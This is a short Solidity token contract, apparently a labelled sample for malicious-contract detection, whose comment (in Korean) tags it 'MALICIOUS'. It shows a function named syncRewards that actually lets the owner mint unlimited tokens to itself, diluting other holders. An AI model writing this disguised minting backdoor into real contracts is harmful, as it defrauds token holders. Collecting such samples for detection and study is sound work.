// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// syncRewards()라는 이름과 달리 소유자가 상한 없이 자신의 잔고와 totalSupply를 증가시킬 수 있어 기존 보유자의 지분을 임의로 희석할 수 있습니다.
pragma solidity ^0.8.20;

contract DisguisedMint {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function syncRewards(uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[owner] += amount;
    }
}
